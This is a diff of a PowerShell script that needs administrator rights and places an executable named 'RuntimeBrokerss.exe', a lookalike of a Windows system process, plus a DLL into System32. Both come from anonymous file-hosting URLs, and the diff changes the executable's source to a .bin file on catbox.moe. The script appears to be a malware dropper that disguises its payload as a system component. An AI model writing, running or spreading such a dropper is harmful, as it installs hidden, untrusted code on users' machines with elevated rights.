@@ -20,9 +20,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Define paths and variables
 # -----------------------------
 $system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokers.exe"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://store-na-phx-4.gofile.io/download/web/2982f45f-63f4-4469-ab36-4d019302c52a/hee.exe"
+$exeUrl = "https://files.catbox.moe/4i0sf6.bin"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -98,6 +98,7 @@ else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 
 }
+
 
 
 
